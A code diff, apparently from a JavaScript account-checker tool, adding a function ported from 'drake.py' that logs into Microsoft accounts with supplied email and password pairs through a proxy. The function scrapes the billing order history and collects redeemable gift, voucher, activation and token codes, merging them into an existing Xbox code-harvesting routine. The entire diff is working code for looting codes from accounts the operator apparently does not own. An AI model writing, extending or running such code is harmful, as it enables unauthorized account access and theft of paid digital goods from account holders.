@@ -393,6 +393,108 @@ function isLink(resource) {
   return resource && (resource.startsWith("http://") || resource.startsWith("https://"));
 }
 
+// ── Order-history scrape (1:1 port of drake.py scrape_codes) ──
+
+const CODE_FIELD_KEYS = new Set([
+  "tokencode", "token_code",
+  "giftcode", "gift_code",
+  "promotioncode", "promotion_code",
+  "vouchercode", "voucher_code",
+  "activationcode", "activation_code",
+  "code",
+  "digitalcode", "digital_code",
+]);
+
+function isCodeValue(val) {
+  if (typeof val !== "string") return false;
+  const v = val.trim();
+  if (v.length < 10) return false;
+  if (!/[A-Za-z]/.test(v)) return false;
+  if (/^\d+$/.test(v)) return false;
+  const low = v.toLowerCase();
+  if (low.includes("http") || low.includes("www")) return false;
+  if (/\s/.test(v)) return false;
+  if (!/[0-9]/.test(v)) return false;
+  return true;
+}
+
+function deepCodeFieldScan(obj, uniqueCodes, found) {
+  if (!obj) return;
+  if (Array.isArray(obj)) {
+    for (const v of obj) deepCodeFieldScan(v, uniqueCodes, found);
+    return;
+  }
+  if (typeof obj === "object") {
+    for (const [k, v] of Object.entries(obj)) {
+      if (CODE_FIELD_KEYS.has(k.toLowerCase()) && isCodeValue(v) && !uniqueCodes.has(v)) {
+        uniqueCodes.add(v);
+        found.push(v);
+      }
+      deepCodeFieldScan(v, uniqueCodes, found);
+    }
+  }
+}
+
+/**
+ * Pull codes from MS account order history (drake-style).
+ * Reuses our existing loginMicrosoftStore session, then scrapes
+ * /billing/orders/list and deep-scans items for code fields.
+ */
+async function fetchCodesFromOrders(email, password) {
+  try {
+    const session = await loginMicrosoftStore(email, password);
+    if (!session) return [];
+    const { cookieJar, headers } = session;
+
+    // Get verification token from billing/payments page
+    const payRes = await proxiedFetch(
+      "https://account.microsoft.com/billing/payments?fref=home.drawers.payment-options.manage-payment&refd=account.microsoft.com",
+      { headers: { ...headers, Cookie: cookieJar }, redirect: "follow" }
+    );
+    const payText = await payRes.text();
+    const vrfMatch = payText.match(/<input name="__RequestVerificationToken" type="hidden" value="([^"]+)"/);
+    if (!vrfMatch) return [];
+    const vrfToken = vrfMatch[1];
+
+    // Order history — same params as drake
+    const params = new URLSearchParams({
+      period: "AllTime",
+      orderTypeFilter: "All",
+      filterChangeCount: "0",
+      isInD365Orders: "true",
+      isPiDetailsRequired: "true",
+      timeZoneOffsetMinutes: "-330",
+    });
+    const ordersRes = await proxiedFetch(
+      `https://account.microsoft.com/billing/orders/list?${params}`,
+      {
+        headers: {
+          ...headers,
+          Cookie: cookieJar,
+          __RequestVerificationToken: vrfToken,
+          Accept: "application/json",
+        },
+      }
+    );
+    if (ordersRes.status !== 200) return [];
+    const json = await ordersRes.json().catch(() => null);
+    if (!json) return [];
+
+    const unique = new Set();
+    const found = [];
+    const orders = json.orders || [];
+    for (const order of orders) {
+      for (const item of (order.items || [])) {
+        deepCodeFieldScan(item, unique, found);
+        // Drake also picks up giftCode on GiftSent items — covered by deep scan.
+      }
+    }
+    return found;
+  } catch {
+    return [];
+  }
+}
+
 async function fetchCodesFromXbox(uhs, xstsToken) {
   try {
     const auth = `XBL3.0 x=${uhs};${xstsToken}`;
@@ -782,6 +884,16 @@ async function fetchFromAccount(email, password) {
     if (!uhs) return { email, codes: [], links: [], error: "Xbox tokens failed" };
 
     const { codes, links } = await fetchCodesFromXbox(uhs, xstsToken);
+
+    // Drake-style order-history scrape (side-by-side, merged into same pipeline)
+    let orderCodes = [];
+    try {
+      orderCodes = await fetchCodesFromOrders(email, password);
+    } catch {}
+
+    const seen = new Set(codes);
+    for (const c of orderCodes) if (!seen.has(c)) { seen.add(c); codes.push(c); }
+
     return { email, codes, links };
   } catch (err) {
     return { email, codes: [], links: [], error: err.message };
